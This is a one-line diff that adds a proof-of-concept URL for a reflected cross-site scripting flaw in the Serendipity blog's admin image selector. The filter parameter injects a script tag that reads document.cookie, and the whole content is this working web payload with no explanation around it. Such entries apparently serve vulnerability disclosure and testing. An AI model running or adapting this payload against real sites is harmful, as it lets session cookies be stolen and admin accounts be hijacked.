@@ -1,0 +1,1 @@
+http://www.example.com/serendipity/serendipity_admin_image_selector.php?serendipity[filter][bp.ALT]=</script><script>alert(document.cookie)</script>&go=+-+Go!+-+
